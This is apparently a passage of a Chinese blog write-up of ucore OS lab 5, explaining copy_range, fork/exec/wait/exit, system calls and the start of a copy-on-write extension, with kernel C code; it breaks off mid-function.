<p>创建子进程的函数do_fork在执行中将拷贝当前进程（即父进程）的用户内存地址空间中的合法内容到新进程中（子进程），完成内存资源的复制。具体是通过copy_range函数实现的，请补充copy_range的实现，确保能够正确执行。。</p>
</blockquote>
<p>实现代码如下，详细信息以注释的形式写到代码中：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* copy_range - copy content of memory (start, end) of one process A to another process B</span></span><br><span class="line"><span class="comment"> * @to:    the addr of process B's Page Directory</span></span><br><span class="line"><span class="comment"> * @from:  the addr of process A's Page Directory</span></span><br><span class="line"><span class="comment"> * @share: flags to indicate to dup OR share. We just use dup method, so it didn't be used.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * CALL GRAPH: copy_mm--&gt;dup_mmap--&gt;copy_range</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">int</span></span><br><span class="line">copy_range(<span class="keyword">pde_t</span> *to, <span class="keyword">pde_t</span> *from, <span class="keyword">uintptr_t</span> start, <span class="keyword">uintptr_t</span> end, <span class="keyword">bool</span> share) &#123;</span><br><span class="line">    assert(start % PGSIZE == <span class="number">0</span> &amp;&amp; end % PGSIZE == <span class="number">0</span>);</span><br><span class="line">    assert(USER_ACCESS(start, end));</span><br><span class="line">    <span class="comment">// copy content by page unit.</span></span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        <span class="comment">//call get_pte to find process A's pte according to the addr start</span></span><br><span class="line">        <span class="keyword">pte_t</span> *ptep = get_pte(from, start, <span class="number">0</span>), *nptep;</span><br><span class="line">        <span class="keyword">if</span> (ptep == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            start = ROUNDDOWN(start + PTSIZE, PTSIZE);</span><br><span class="line">            <span class="keyword">continue</span> ;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//call get_pte to find process B's pte according to the addr start. If pte is NULL, just alloc a PT</span></span><br><span class="line">        <span class="keyword">if</span> (*ptep &amp; PTE_P) &#123;</span><br><span class="line">            <span class="keyword">if</span> ((nptep = get_pte(to, start, <span class="number">1</span>)) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> -E_NO_MEM;</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">uint32_t</span> perm = (*ptep &amp; PTE_USER);</span><br><span class="line">        <span class="comment">//get page from ptep</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">Page</span> *<span class="title">page</span> = <span class="title">pte2page</span>(*<span class="title">ptep</span>);</span></span><br><span class="line">        <span class="comment">// alloc a page for process B</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">Page</span> *<span class="title">npage</span>=<span class="title">alloc_page</span>();</span></span><br><span class="line">        assert(page!=<span class="literal">NULL</span>);</span><br><span class="line">        assert(npage!=<span class="literal">NULL</span>);</span><br><span class="line">        <span class="keyword">int</span> ret=<span class="number">0</span>;</span><br><span class="line">        <span class="comment">/* LAB5:EXERCISE2 YOUR CODE</span></span><br><span class="line"><span class="comment">         * replicate content of page to npage, build the map of phy addr of nage with the linear addr start</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="comment">// 获取源页面所在的虚拟地址（注意，此时的PDT是内核状态下的页目录表）</span></span><br><span class="line">        <span class="keyword">void</span> * kva_src = page2kva(page);</span><br><span class="line">        <span class="comment">// 获取目标页面所在的虚拟地址</span></span><br><span class="line">        <span class="keyword">void</span> * kva_dst = page2kva(npage);</span><br><span class="line">        <span class="comment">// 页面数据复制</span></span><br><span class="line">        <span class="built_in">memcpy</span>(kva_dst, kva_src, PGSIZE);</span><br><span class="line">        <span class="comment">// 将该页面设置至对应的PTE中</span></span><br><span class="line">        ret = page_insert(to, npage, start, perm);</span><br><span class="line"></span><br><span class="line">        assert(ret == <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        start += PGSIZE;</span><br><span class="line">    &#125; <span class="keyword">while</span> (start != <span class="number">0</span> &amp;&amp; start &lt; end);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>
<p>简要说明如何设计实现”Copy on Write 机制“，给出概要设计，鼓励给出详细设计。</p>
<blockquote>
<p>请移步<strong>扩展练习</strong> 。</p>
</blockquote>
</li>
</ul>
<h3 id="3-练习3">3) 练习3</h3>
<blockquote>
<p><strong>阅读分析源代码，理解进程执行 fork/exec/wait/exit 的实现，以及系统调用的实现</strong></p>
</blockquote>
<h4 id="1-do-fork">1. do_fork</h4>
<ul>
<li>
<p>lab5中的<code>do_fork</code>函数与lab4中的实现类似，所不同的是lab5中使用<code>set_links(proc)</code>函数来设置进程间的关系，而不是简单的<code>list_add</code>与<code>nr_process++</code>。</p>
</li>
<li>
<p><code>set_links</code>函数会为当前进程间设置合适的关系，其实现如下：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*************************************************************</span></span><br><span class="line"><span class="comment">process relations</span></span><br><span class="line"><span class="comment">parent:           proc-&gt;parent  (proc is children)</span></span><br><span class="line"><span class="comment">children:         proc-&gt;cptr    (proc is parent)</span></span><br><span class="line"><span class="comment">older sibling:    proc-&gt;optr    (proc is younger sibling)</span></span><br><span class="line"><span class="comment">younger sibling:  proc-&gt;yptr    (proc is older sibling)</span></span><br><span class="line"><span class="comment">*************************************************************/</span></span><br><span class="line"><span class="comment">// set_links - set the relation links of process</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">set_links</span><span class="params">(struct proc_struct *proc)</span> </span>&#123;</span><br><span class="line">    list_add(&amp;proc_list, &amp;(proc-&gt;list_link));</span><br><span class="line">    proc-&gt;yptr = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span> ((proc-&gt;optr = proc-&gt;parent-&gt;cptr) != <span class="literal">NULL</span>)</span><br><span class="line">        proc-&gt;optr-&gt;yptr = proc;</span><br><span class="line">    proc-&gt;parent-&gt;cptr = proc;</span><br><span class="line">    nr_process ++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>
<p>除了lab4熟知的<code>list_add</code>与<code>nr_process++</code>，该函数还设置了<code>proc_struct</code>中的<code>optr、yptr</code>以及<code>cptr</code>成员。</p>
</li>
<li>
<p>其中，<code>cptr</code>指针指向当前进程的子进程中，<strong>最晚创建</strong>的那个子进程，即<code>children</code>；<code>yptr</code>指向<strong>与当前进程共享同一个父进程，但比当前进程的创建时间更晚的进程</strong>，即<code>younger sibling</code>。而<code>optr</code>指针的功能则与<code>yptr</code>相反，指向<code>older sibling</code>。</p>
</li>
<li>
<p>进程间关系如下图所示</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">                     +----------------+</span><br><span class="line">                     | parent process |</span><br><span class="line">                     +----------------+</span><br><span class="line">              parent ^         \       ^  parent</span><br><span class="line">                    &#x2F;           \       \</span><br><span class="line">                   &#x2F;             \ cptr  \</span><br><span class="line">                  &#x2F;         yptr  V       \      yptr</span><br><span class="line">           +-------------+  --&gt;  +-------------+  --&gt;  NULL</span><br><span class="line">           | old process |       | New Process |</span><br><span class="line">NULL  &lt;--  +-------------+  &lt;--  +-------------+</span><br><span class="line">      optr                  optr</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ul>
<h4 id="2-do-execve">2. do_execve</h4>
<ul>
<li>
<p><code>do_execve</code>函数做的事请比较简单</p>
<ul>
<li>检查当前进程所分配的内存区域是否存在异常。</li>
<li>回收当前进程的所有资源，包括已分配的内存空间/页目录表等等。</li>
<li>读取可执行文件，并根据<code>ELFheader</code>分配特定位置的虚拟内存，并加载代码与数据至特定的内存地址，最后分配堆栈并设置<code>trapframe</code>属性。</li>
<li>设置新进程名称。</li>
</ul>
</li>
<li>
<p>该函数<strong>几乎释放原进程所有的资源，除了PCB</strong>。也就是说，<code>do_execve</code>保留了原进程的PID、原进程的属性、原进程与其他进程之间的关系等等。</p>
</li>
<li>
<p>该函数的具体实现如下</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">do_execve(<span class="keyword">const</span> <span class="keyword">char</span> *name, <span class="keyword">size_t</span> len, <span class="keyword">unsigned</span> <span class="keyword">char</span> *binary, <span class="keyword">size_t</span> size) &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span> = <span class="title">current</span>-&gt;<span class="title">mm</span>;</span></span><br><span class="line">    <span class="keyword">if</span> (!user_mem_check(mm, (<span class="keyword">uintptr_t</span>)name, len, <span class="number">0</span>))</span><br><span class="line">        <span class="keyword">return</span> -E_INVAL;</span><br><span class="line">    <span class="keyword">if</span> (len &gt; PROC_NAME_LEN)</span><br><span class="line">        len = PROC_NAME_LEN;</span><br><span class="line">    <span class="keyword">char</span> local_name[PROC_NAME_LEN + <span class="number">1</span>];</span><br><span class="line">    <span class="built_in">memset</span>(local_name, <span class="number">0</span>, <span class="keyword">sizeof</span>(local_name));</span><br><span class="line">    <span class="built_in">memcpy</span>(local_name, name, len);</span><br><span class="line">    <span class="comment">// 释放内存</span></span><br><span class="line">    <span class="keyword">if</span> (mm != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        lcr3(boot_cr3);</span><br><span class="line">        <span class="keyword">if</span> (mm_count_dec(mm) == <span class="number">0</span>) &#123;</span><br><span class="line">            exit_mmap(mm);</span><br><span class="line">            <span class="comment">// 删除该内存管理所对应的PDT</span></span><br><span class="line">            put_pgdir(mm);</span><br><span class="line">            mm_destroy(mm);</span><br><span class="line">        &#125;</span><br><span class="line">        current-&gt;mm = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 加载可执行文件代码，重设mm_struct，以及重置trapframe</span></span><br><span class="line">    <span class="keyword">int</span> ret;</span><br><span class="line">    <span class="keyword">if</span> ((ret = load_icode(binary, size)) != <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">goto</span> execve_exit;</span><br><span class="line">    <span class="comment">// 设置进程名称</span></span><br><span class="line">    set_proc_name(current, local_name);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">execve_exit:</span><br><span class="line">    do_exit(ret);</span><br><span class="line">    panic(<span class="string">"already exit: %e.\n"</span>, ret);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h4 id="3-do-wait">3. do_wait</h4>
<ul>
<li>
<p><code>do_wait</code>程序会使某个进程一直等待，直到（特定）子进程退出后，该进程才会回收该子进程的资源并函数返回。该函数的具体操作如下：</p>
<ul>
<li>检查当前进程所分配的内存区域是否存在异常。</li>
<li>查找特定/所有子进程中是否存在某个等待父进程回收的子进程（<code>PROC_ZOMBIE</code>）。
<ul>
<li>如果有，则回收该进程并函数返回。</li>
<li>如果没有，则设置当前进程状态为<code>PROC_SLEEPING</code>并执行<code>schedule</code>调度其他进程运行。当该进程的某个子进程结束运行后，当前进程会被唤醒，并在<code>do_wait</code>函数中回收子进程的<strong>PCB内存</strong>资源。</li>
</ul>
</li>
</ul>
</li>
<li>
<p>该函数的具体实现如下：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">do_wait(<span class="keyword">int</span> pid, <span class="keyword">int</span> *code_store) &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span> = <span class="title">current</span>-&gt;<span class="title">mm</span>;</span></span><br><span class="line">    <span class="keyword">if</span> (code_store != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!user_mem_check(mm, (<span class="keyword">uintptr_t</span>)code_store, <span class="keyword">sizeof</span>(<span class="keyword">int</span>), <span class="number">1</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> -E_INVAL;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">proc_struct</span> *<span class="title">proc</span>;</span></span><br><span class="line">    <span class="keyword">bool</span> intr_flag, haskid;</span><br><span class="line">repeat:</span><br><span class="line">    haskid = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (pid != <span class="number">0</span>) &#123;</span><br><span class="line">        proc = find_proc(pid);</span><br><span class="line">        <span class="keyword">if</span> (proc != <span class="literal">NULL</span> &amp;&amp; proc-&gt;parent == current) &#123;</span><br><span class="line">            haskid = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span> (proc-&gt;state == PROC_ZOMBIE)</span><br><span class="line">                <span class="keyword">goto</span> found;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        proc = current-&gt;cptr;</span><br><span class="line">        <span class="keyword">for</span> (; proc != <span class="literal">NULL</span>; proc = proc-&gt;optr) &#123;</span><br><span class="line">            haskid = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span> (proc-&gt;state == PROC_ZOMBIE)</span><br><span class="line">                <span class="keyword">goto</span> found;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (haskid) &#123;</span><br><span class="line">        current-&gt;state = PROC_SLEEPING;</span><br><span class="line">        current-&gt;wait_state = WT_CHILD;</span><br><span class="line">        schedule();</span><br><span class="line">        <span class="keyword">if</span> (current-&gt;flags &amp; PF_EXITING)</span><br><span class="line">            do_exit(-E_KILLED);</span><br><span class="line">        <span class="keyword">goto</span> repeat;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> -E_BAD_PROC;</span><br><span class="line"></span><br><span class="line">found:</span><br><span class="line">    <span class="keyword">if</span> (proc == idleproc || proc == initproc)</span><br><span class="line">        panic(<span class="string">"wait idleproc or initproc.\n"</span>);</span><br><span class="line">    <span class="keyword">if</span> (code_store != <span class="literal">NULL</span>)</span><br><span class="line">        *code_store = proc-&gt;exit_code;</span><br><span class="line">    local_intr_save(intr_flag);</span><br><span class="line">    &#123;</span><br><span class="line">        unhash_proc(proc);</span><br><span class="line">        remove_links(proc);</span><br><span class="line">    &#125;</span><br><span class="line">    local_intr_restore(intr_flag);</span><br><span class="line">    put_kstack(proc);</span><br><span class="line">    kfree(proc);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h4 id="4-do-exit">4. do_exit</h4>
<ul>
<li>
<p>该函数与<code>do_execve/do_wait</code>函数中的进程回收代码类似，但又有所不同。其具体操作如下：</p>
<ul>
<li>
<p>·回收所有内存（除了PCB，该结构只能由父进程回收）</p>
</li>
<li>
<p>设置当前的进程状态为<code>PROC_ZOMBIE</code></p>
</li>
<li>
<p>设置当前进程的退出值<code>current-&gt;exit_code</code>。</p>
</li>
<li>
<p>如果有父进程，则唤醒父进程，使其准备回收该进程的PCB。</p>
<blockquote>
<p>正常情况下，除了<code>initproc</code>和<code>idleproc</code>以外，其他进程一定存在父进程。</p>
</blockquote>
</li>
<li>
<p>如果当前进程存在子进程，则设置所有子进程的父进程为<code>initproc</code>。这样倘若这些子进程进入结束状态，则<code>initproc</code>可以代为回收资源。</p>
</li>
<li>
<p>执行进程调度。一旦调度到当前进程的父进程，则可以马上回收该终止进程的<code>PCB</code>。</p>
</li>
</ul>
</li>
<li>
<p>该函数的具体实现如下</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">do_exit</span><span class="params">(<span class="keyword">int</span> error_code)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (current == idleproc)</span><br><span class="line">        panic(<span class="string">"idleproc exit.\n"</span>);</span><br><span class="line">    <span class="keyword">if</span> (current == initproc)</span><br><span class="line">        panic(<span class="string">"initproc exit.\n"</span>);</span><br><span class="line">    <span class="comment">// 释放所有内存空间</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span> = <span class="title">current</span>-&gt;<span class="title">mm</span>;</span></span><br><span class="line">    <span class="keyword">if</span> (mm != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        lcr3(boot_cr3);</span><br><span class="line">        <span class="keyword">if</span> (mm_count_dec(mm) == <span class="number">0</span>) &#123;</span><br><span class="line">            exit_mmap(mm);</span><br><span class="line">            put_pgdir(mm);</span><br><span class="line">            mm_destroy(mm);</span><br><span class="line">        &#125;</span><br><span class="line">        current-&gt;mm = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 设置当前进程状态</span></span><br><span class="line">    current-&gt;state = PROC_ZOMBIE;</span><br><span class="line">    current-&gt;exit_code = error_code;</span><br><span class="line">    <span class="comment">// 请求父进程回收剩余资源</span></span><br><span class="line">    <span class="keyword">bool</span> intr_flag;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">proc_struct</span> *<span class="title">proc</span>;</span></span><br><span class="line">    local_intr_save(intr_flag);</span><br><span class="line">    &#123;</span><br><span class="line">        proc = current-&gt;parent;</span><br><span class="line">        <span class="comment">// 唤醒父进程。父进程准备回收该进程的PCB资源。</span></span><br><span class="line">        <span class="keyword">if</span> (proc-&gt;wait_state == WT_CHILD)</span><br><span class="line">            wakeup_proc(proc);</span><br><span class="line">        <span class="comment">// 如果当前进程存在子进程，则设置所有子进程的父进程为init。</span></span><br><span class="line">        <span class="keyword">while</span> (current-&gt;cptr != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            proc = current-&gt;cptr;</span><br><span class="line">            current-&gt;cptr = proc-&gt;optr;</span><br><span class="line"></span><br><span class="line">            proc-&gt;yptr = <span class="literal">NULL</span>;</span><br><span class="line">            <span class="keyword">if</span> ((proc-&gt;optr = initproc-&gt;cptr) != <span class="literal">NULL</span>)</span><br><span class="line">                initproc-&gt;cptr-&gt;yptr = proc;</span><br><span class="line">            proc-&gt;parent = initproc;</span><br><span class="line">            initproc-&gt;cptr = proc;</span><br><span class="line">            <span class="keyword">if</span> (proc-&gt;state == PROC_ZOMBIE) &#123;</span><br><span class="line">                <span class="keyword">if</span> (initproc-&gt;wait_state == WT_CHILD)</span><br><span class="line">                    wakeup_proc(initproc);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    local_intr_restore(intr_flag);</span><br><span class="line">    <span class="comment">// 该进程的生命周期即将结束，调度其他进程执行。</span></span><br><span class="line">    schedule();</span><br><span class="line">    panic(<span class="string">"do_exit will not return!! %d.\n"</span>, current-&gt;pid);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h4 id="5-syscall系统调用">5. syscall系统调用</h4>
<ul>
<li>
<p><code>syscall</code>是内核程序为用户程序提供内核服务的一种方式。</p>
</li>
<li>
<p>在用户程序中，若需用到内核服务，则需要执行<code>sys_xxxx</code>函数，例如<code>sys_kill</code>：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sys_kill</span><span class="params">(<span class="keyword">int</span> pid)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(SYS_kill, pid);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>实际上，<code>sys_xxxx</code>函数全都是用户态<code>syscall</code>函数的wrapper。那些函数会设置参数并执行<code>syscall</code>函数，而该函数的实现如下：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">syscall</span><span class="params">(<span class="keyword">int</span> num, ...)</span> </span>&#123;</span><br><span class="line">    va_list ap;</span><br><span class="line">    va_start(ap, num);</span><br><span class="line">    <span class="keyword">uint32_t</span> a[MAX_ARGS];</span><br><span class="line">    <span class="keyword">int</span> i, ret;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MAX_ARGS; i ++)</span><br><span class="line">        a[i] = va_arg(ap, <span class="keyword">uint32_t</span>);</span><br><span class="line">    va_end(ap);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">asm</span> <span class="title">volatile</span> <span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">        <span class="string">"int %1;"</span></span></span></span><br><span class="line"><span class="function"><span class="params">        : <span class="string">"=a"</span> (ret)</span></span></span><br><span class="line"><span class="function"><span class="params">        : <span class="string">"i"</span> (T_SYSCALL),</span></span></span><br><span class="line"><span class="function"><span class="params">          <span class="string">"a"</span> (num),</span></span></span><br><span class="line"><span class="function"><span class="params">          <span class="string">"d"</span> (a[<span class="number">0</span>]),</span></span></span><br><span class="line"><span class="function"><span class="params">          <span class="string">"c"</span> (a[<span class="number">1</span>]),</span></span></span><br><span class="line"><span class="function"><span class="params">          <span class="string">"b"</span> (a[<span class="number">2</span>]),</span></span></span><br><span class="line"><span class="function"><span class="params">          <span class="string">"D"</span> (a[<span class="number">3</span>]),</span></span></span><br><span class="line"><span class="function"><span class="params">          <span class="string">"S"</span> (a[<span class="number">4</span>])</span></span></span><br><span class="line"><span class="function"><span class="params">        : <span class="string">"cc"</span>, <span class="string">"memory"</span>)</span></span>;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>该函数会设置<code>%eax, %edx, %ecx, %ebx, %edi, %esi</code>五个寄存器的值分别为<strong>syscall调用号、参数1、参数2、参数3、参数4、参数5</strong>，然后执行int中断进入中断处理例程。</p>
</li>
<li>
<p>在中断处理例程中，程序会根据中断号，执行<code>syscall</code>函数（注意该syscall函数为内核代码，非用户库中的syscall函数）。内核syscall函数会一一取出六个寄存器的值，并根据系统调用号来执行不同的系统调用。而那些系统调用的实质就是其他内核函数的wrapper。以下为<code>syscall</code>函数实现的代码：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">syscall(<span class="keyword">void</span>) &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">trapframe</span> *<span class="title">tf</span> = <span class="title">current</span>-&gt;<span class="title">tf</span>;</span></span><br><span class="line">    <span class="keyword">uint32_t</span> arg[<span class="number">5</span>];</span><br><span class="line">    <span class="keyword">int</span> num = tf-&gt;tf_regs.reg_eax;</span><br><span class="line">    <span class="keyword">if</span> (num &gt;= <span class="number">0</span> &amp;&amp; num &lt; NUM_SYSCALLS) &#123;</span><br><span class="line">        <span class="keyword">if</span> (syscalls[num] != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            arg[<span class="number">0</span>] = tf-&gt;tf_regs.reg_edx;</span><br><span class="line">            arg[<span class="number">1</span>] = tf-&gt;tf_regs.reg_ecx;</span><br><span class="line">            arg[<span class="number">2</span>] = tf-&gt;tf_regs.reg_ebx;</span><br><span class="line">            arg[<span class="number">3</span>] = tf-&gt;tf_regs.reg_edi;</span><br><span class="line">            arg[<span class="number">4</span>] = tf-&gt;tf_regs.reg_esi;</span><br><span class="line">            tf-&gt;tf_regs.reg_eax = syscalls[num](arg);</span><br><span class="line">            <span class="keyword">return</span> ;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    print_trapframe(tf);</span><br><span class="line">    panic(<span class="string">"undefined syscall %d, pid = %d, name = %s.\n"</span>,</span><br><span class="line">            num, current-&gt;pid, current-&gt;name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>等相应的内核函数结束后，程序通过之前保留的<code>trapframe</code>返回用户态。一次系统调用结束。</p>
</li>
</ul>
<h4 id="Questions">*. Questions</h4>
<p>简要说明你对 fork/exec/wait/exit函数的分析。并回答如下问题：</p>
<ul>
<li>
<p>请分析fork/exec/wait/exit在实现中是如何影响进程的执行状态的？</p>
<ul>
<li>fork会修改其子进程的状态为<code>PROC_RUNNABLE</code>，而当前进程状态不变。</li>
<li>exec不修改当前进程的状态，但会替换内存空间里所有的数据与代码。</li>
<li>wait会先检测是否存在子进程。如果存在进入<code>PROC_ZONBIE</code>的子进程，则回收该进程并函数返回。但若存在尚处于<code>PROC_RUNNABLE</code>的子进程，则当前进程会进入<code>PROC_SLEEPING</code>状态，并等待子进程唤醒。</li>
<li>exit会将当前进程状态设置为<code>PROC_ZONBIE</code>，并唤醒父进程，使其处于<code>PROC_RUNNABLE</code>的状态，之后主动让出CPU。</li>
</ul>
</li>
<li>
<p>请给出ucore中一个用户态进程的执行状态生命周期图（包括执行状态，执行状态之间的变换关系，以及产生变换的事件或函数调用）。</p>
  <pre class="mermaid">    stateDiagram-v2
  [*]-->UNINIT : alloc_proc
  UNINIT-->RUNNABLE : proc_init/wakeup_proc
  RUNNING-->SLEEPING : try_free_pages/do_wait/do_sleep
  RUNNING-->ZONBIE : do_exit
  RUNNABLE-->RUNNING : 调度器调度
  RUNNING-->RUNNABLE : 时间片耗尽
  SLEEPING-->RUNNABLE : wakeup_proc
  ZONBIE-->[*] : 资源回收</pre>
</li>
</ul>
<h3 id="4-扩展练习">4) 扩展练习</h3>
<blockquote>
<p><strong>实现 Copy on Write （COW）机制</strong></p>
<p>同时，由于COW实现比较复杂，容易引入bug，请参考 <a href="https://dirtycow.ninja/" target="_blank" rel="noopener">Dirty COW (CVE-2016-5195)</a> 看看能否在ucore的COW实现中模拟这个错误和解决方案。需要有解释。</p>
<p>这是一个big challenge.</p>
</blockquote>
<h4 id="1-思路">1. 思路</h4>
<p>当一个用户父进程创建自己的子进程时，父进程会把其申请的用户空间设置为只读，子进程可共享父进程占用的用户内存空间中的页面（这就是一个共享的资源）。当其中任何一个进程修改此用户内存空间中的某页面时，ucore会通过page fault异常获知该操作，并完成拷贝内存页面，使得两个进程都有各自的内存页面。这样一个进程所做的修改不会被另外一个进程可见了。（uCore实验手册原句）</p>
<h4 id="2-具体实现">2. 具体实现</h4>
<ul>
<li>
<p>当进行内存访问时，CPU会根据PTE上的读写位<code>PTE_P</code>、<code>PTE_W</code>来确定当前内存操作是否允许，如果不允许，则缺页中断。我们可以在<code>copy_range</code>函数中，将父进程中所有PTE中的<code>PTE_W</code>置为0，这样便可以将父进程中所有空间都设置为只读。然后使子进程的PTE全部指向父进程中PTE存放的物理地址，这样便可以达到内存共享的目的。</p>
<blockquote>
<p>为什么要设置父进程所有空间为只读呢，因为在之后的内存操作中，如果对这些空间进行写操作的话，程序就会触发缺页中断，那么CPU就可以在缺页中断程序中复制该内存，也就是写时复制。</p>
</blockquote>
<blockquote>
<p>为什么在copy_range函数中实现内存共享呢？因为我们可以在该函数中对其传入的<code>share</code>参数进行处理。</p>
</blockquote>
<p>最终实现如下：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">copy_range(<span class="keyword">pde_t</span> *to, <span class="keyword">pde_t</span> *from, <span class="keyword">uintptr_t</span> start, <span class="keyword">uintptr_t</span> end, <span class="keyword">bool</span> share) &#123;</span><br><span class="line">    assert(start % PGSIZE == <span class="number">0</span> &amp;&amp; end % PGSIZE == <span class="number">0</span>);</span><br><span class="line">    assert(USER_ACCESS(start, end));</span><br><span class="line">    <span class="comment">// copy content by page unit.</span></span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        <span class="comment">//call get_pte to find process A's pte according to the addr start</span></span><br><span class="line">        <span class="keyword">pte_t</span> *ptep = get_pte(from, start, <span class="number">0</span>), *nptep;</span><br><span class="line">        <span class="keyword">if</span> (ptep == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            start = ROUNDDOWN(start + PTSIZE, PTSIZE);</span><br><span class="line">            <span class="keyword">continue</span> ;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//call get_pte to find process B's pte according to the addr start. If pte is NULL, just alloc a PT</span></span><br><span class="line">        <span class="keyword">if</span> (*ptep &amp; PTE_P) &#123;</span><br><span class="line">            <span class="keyword">if</span> ((nptep = get_pte(to, start, <span class="number">1</span>)) == <span class="literal">NULL</span>)</span><br><span class="line">                <span class="keyword">return</span> -E_NO_MEM;</span><br><span class="line">            <span class="keyword">uint32_t</span> perm = (*ptep &amp; PTE_USER);</span><br><span class="line">            <span class="comment">//get page from ptep</span></span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">Page</span> *<span class="title">page</span> = <span class="title">pte2page</span>(*<span class="title">ptep</span>);</span></span><br><span class="line">            <span class="keyword">int</span> ret = <span class="number">0</span>;</span><br><span class="line">            <span class="comment">// 如果启用写时复制</span></span><br><span class="line">            <span class="keyword">if</span>(share)</span><br><span class="line">            &#123;</span><br><span class="line">                cprintf(<span class="string">"Sharing the page 0x%x\n"</span>, page2kva(page));</span><br><span class="line">                <span class="comment">// 物理页面共享，并设置两个PTE上的标志位为只读</span></span><br><span class="line">                page_insert(from, page, start, perm &amp; ~PTE_W);</span><br><span class="line">                ret = page_insert(to, page, start, perm &amp; ~PTE_W);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 完整拷贝内存</span></span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">// alloc a page for process B</span></span><br><span class="line">                <span class="comment">// 目标页面地址</span></span><br><span class="line">                struct Page *npage = alloc_page();</span><br><span class="line">                assert(page!=<span class="literal">NULL</span>);</span><br><span class="line">                assert(npage!=<span class="literal">NULL</span>);</span><br><span class="line">                cprintf(<span class="string">"alloc a new page 0x%x\n"</span>, page2kva(npage));</span><br><span class="line">          